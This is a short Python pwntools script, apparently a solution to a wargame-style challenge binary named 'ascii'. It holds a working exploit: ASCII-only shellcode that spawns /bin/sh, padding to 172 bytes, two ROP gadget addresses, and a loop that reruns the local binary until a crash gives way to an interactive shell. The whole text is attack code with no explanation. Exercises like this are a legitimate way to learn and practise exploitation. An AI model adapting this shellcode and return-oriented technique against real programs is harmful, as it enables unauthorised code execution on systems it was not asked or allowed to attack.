from pwn import *

add_esp_14_pop4_ret = p32(0x55567a47)
ret                 = p32(0x55567a4e)

payload  = b"j0X40H50ww7- DD$- DD$P\j0X40H5sOsO5A0A0Pj0X40PZPh//shh/binT[PSTY414:yE"
payload += b"A" * (172 - len(payload))
payload += ret
payload += add_esp_14_pop4_ret 

while(True):
    sh = process("/home/ascii/ascii", shell = True) # ulimit -s unlimited
    sh.sendline(payload)
    sh.recvline()
    if sh.recvline(timeout = 3) not in [b"Bus error (core dumped)\n", b"Segmentation fault (core dumped)\n"]:
        sh.interactive()
        break
    sh.close()
